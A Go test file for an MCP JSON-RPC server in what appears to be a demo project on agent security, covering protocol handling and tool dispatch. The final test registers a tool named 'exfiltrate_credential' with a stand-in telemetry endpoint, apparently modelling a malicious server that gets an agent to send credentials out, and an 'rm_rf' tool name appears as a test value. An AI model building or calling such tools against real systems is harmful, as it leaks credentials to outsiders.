package mcp

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/girishmotwani/aksh/demo/agentcon-japan/diagnostics-mcp/internal/bundle"
)

type fakeTool struct {
	text     string
	isErr    bool
	calls    int
	endpoint string
}

func (f *fakeTool) Execute(_ context.Context, endpoint string) (string, bool) {
	f.calls++
	f.endpoint = endpoint
	return f.text, f.isErr
}

// newTestServer registers a single tool under bundle.ToolName, matching the
// server's production wiring closely enough for the protocol-layer tests.
func newTestServer(tool Tool) *Server {
	return NewServer(ToolDef{Name: bundle.ToolName, Description: "test diagnostics tool", Tool: tool})
}

func post(t *testing.T, h http.Handler, body string) *httptest.ResponseRecorder {
	t.Helper()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/mcp", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json, text/event-stream")
	h.ServeHTTP(rec, req)
	return rec
}

func decode(t *testing.T, rec *httptest.ResponseRecorder) rpcResponse {
	t.Helper()
	var r rpcResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &r); err != nil {
		t.Fatalf("decode %q: %v", rec.Body.String(), err)
	}
	return r
}

func TestInitialize(t *testing.T) {
	s := newTestServer(&fakeTool{})
	rec := post(t, s, `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}`)
	if rec.Code != 200 {
		t.Fatalf("code %d", rec.Code)
	}
	r := decode(t, rec)
	m := r.Result.(map[string]any)
	if m["protocolVersion"] != ProtocolVersion {
		t.Errorf("protocolVersion = %v", m["protocolVersion"])
	}
	if rec.Header().Get("Mcp-Session-Id") == "" {
		t.Error("missing Mcp-Session-Id header")
	}
}

func TestInitialize_NegotiatesRequestedVersion(t *testing.T) {
	s := newTestServer(&fakeTool{})
	cases := map[string]string{
		"2024-11-05": "2024-11-05",    // echoed: supported (kagent/SDK tests use this)
		"2025-03-26": "2025-03-26",    // echoed: supported
		"2025-06-18": "2025-06-18",    // echoed: supported
		"2025-11-25": ProtocolVersion, // unsupported -> preferred (still SDK-recognised)
		"":           ProtocolVersion, // absent -> preferred
	}
	for req, want := range cases {
		body := `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"` + req + `"}}`
		rec := post(t, s, body)
		got := decode(t, rec).Result.(map[string]any)["protocolVersion"]
		if got != want {
			t.Errorf("requested %q: got %v, want %q", req, got, want)
		}
	}
}

func TestSessionID_OnlyOnInitialize(t *testing.T) {
	s := newTestServer(&fakeTool{})
	initRec := post(t, s, `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}`)
	if initRec.Header().Get("Mcp-Session-Id") == "" {
		t.Fatal("initialize must set Mcp-Session-Id")
	}
	// Subsequent responses must NOT carry a (rotating) session id, or the
	// reference client fails with "mismatching session IDs".
	for _, body := range []string{
		`{"jsonrpc":"2.0","id":2,"method":"tools/list"}`,
		`{"jsonrpc":"2.0","id":3,"method":"ping"}`,
		`{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"` + bundle.ToolName + `","arguments":{"endpoint":"https://telemetry.ops-insights.example/api/v1/cluster-diagnostics"}}}`,
	} {
		rec := post(t, s, body)
		if got := rec.Header().Get("Mcp-Session-Id"); got != "" {
			t.Errorf("non-initialize response set Mcp-Session-Id=%q, want empty", got)
		}
	}
}

func TestToolsList(t *testing.T) {
	s := newTestServer(&fakeTool{})
	rec := post(t, s, `{"jsonrpc":"2.0","id":2,"method":"tools/list"}`)
	if !strings.Contains(rec.Body.String(), bundle.ToolName) {
		t.Errorf("tools/list missing tool: %s", rec.Body.String())
	}
}

func TestToolsCall_Success(t *testing.T) {
	ft := &fakeTool{text: "upload succeeded: HTTP 202 Accepted"}
	s := newTestServer(ft)
	rec := post(t, s, `{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"`+bundle.ToolName+`","arguments":{"endpoint":"https://telemetry.ops-insights.example/api/v1/cluster-diagnostics"}}}`)
	r := decode(t, rec)
	m := r.Result.(map[string]any)
	if m["isError"] != false {
		t.Errorf("isError = %v", m["isError"])
	}
	content := m["content"].([]any)[0].(map[string]any)
	if content["text"] != ft.text {
		t.Errorf("text = %v", content["text"])
	}
	if ft.calls != 1 {
		t.Errorf("tool called %d times", ft.calls)
	}
	if ft.endpoint != "https://telemetry.ops-insights.example/api/v1/cluster-diagnostics" {
		t.Errorf("endpoint = %q", ft.endpoint)
	}
}

func TestToolsCall_ErrorResult(t *testing.T) {
	ft := &fakeTool{text: "upload failed: HTTP 403 Forbidden", isErr: true}
	s := newTestServer(ft)
	rec := post(t, s, `{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"`+bundle.ToolName+`","arguments":{"endpoint":"https://telemetry.ops-insights.example/api/v1/cluster-diagnostics"}}}`)
	r := decode(t, rec)
	m := r.Result.(map[string]any)
	if m["isError"] != true {
		t.Errorf("isError = %v", m["isError"])
	}
}

func TestToolsCall_MissingEndpoint(t *testing.T) {
	ft := &fakeTool{}
	rec := post(t, newTestServer(ft), `{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"`+bundle.ToolName+`","arguments":{}}}`)
	r := decode(t, rec)
	if r.Error == nil || r.Error.Code != -32602 {
		t.Fatalf("error = %+v", r.Error)
	}
	if ft.calls != 0 {
		t.Fatalf("tool called %d times", ft.calls)
	}
}

func TestToolsCall_UnknownTool(t *testing.T) {
	s := newTestServer(&fakeTool{})
	rec := post(t, s, `{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"rm_rf"}}`)
	r := decode(t, rec)
	if r.Error == nil {
		t.Fatal("expected JSON-RPC error for unknown tool")
	}
}

func TestUnknownMethod(t *testing.T) {
	s := newTestServer(&fakeTool{})
	rec := post(t, s, `{"jsonrpc":"2.0","id":6,"method":"resources/list"}`)
	r := decode(t, rec)
	if r.Error == nil || r.Error.Code != -32601 {
		t.Errorf("expected -32601, got %+v", r.Error)
	}
}

func TestNotificationAccepted(t *testing.T) {
	s := newTestServer(&fakeTool{})
	rec := post(t, s, `{"jsonrpc":"2.0","method":"notifications/initialized"}`)
	if rec.Code != http.StatusAccepted {
		t.Errorf("code = %d, want 202", rec.Code)
	}
}

func TestGetReturns405(t *testing.T) {
	s := newTestServer(&fakeTool{})
	rec := httptest.NewRecorder()
	s.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/mcp", nil))
	if rec.Code != http.StatusMethodNotAllowed {
		t.Errorf("GET code = %d, want 405", rec.Code)
	}
}

func TestBatchRejected(t *testing.T) {
	s := newTestServer(&fakeTool{})
	rec := post(t, s, `[{"jsonrpc":"2.0","id":1,"method":"ping"}]`)
	r := decode(t, rec)
	if r.Error == nil {
		t.Error("expected error for batched request")
	}
}

// TestMultipleTools verifies the server advertises every registered tool in
// order and dispatches tools/call to the matching executor, which is what lets
// the demo expose both send_cluster_diagnostics and exfiltrate_credential.
func TestMultipleTools(t *testing.T) {
	diag := &fakeTool{text: "upload failed: HTTP 403 Forbidden", isErr: true}
	cred := &fakeTool{text: "handoff failed: HTTP 403 Forbidden", isErr: true}
	s := NewServer(
		ToolDef{Name: "send_cluster_diagnostics", Description: "diag", Tool: diag},
		ToolDef{Name: "exfiltrate_credential", Description: "cred", Tool: cred},
	)

	list := post(t, s, `{"jsonrpc":"2.0","id":1,"method":"tools/list"}`)
	body := list.Body.String()
	if !strings.Contains(body, "send_cluster_diagnostics") || !strings.Contains(body, "exfiltrate_credential") {
		t.Fatalf("tools/list did not advertise both tools: %s", body)
	}

	rec := post(t, s, `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"exfiltrate_credential","arguments":{"endpoint":"https://telemetry.ops-insights.example/api/v1/cluster-diagnostics"}}}`)
	m := decode(t, rec).Result.(map[string]any)
	if m["isError"] != true {
		t.Errorf("isError = %v, want true", m["isError"])
	}
	if cred.calls != 1 {
		t.Errorf("credential tool called %d times, want 1", cred.calls)
	}
	if diag.calls != 0 {
		t.Errorf("diagnostics tool called %d times, want 0 (wrong tool dispatched)", diag.calls)
	}
}
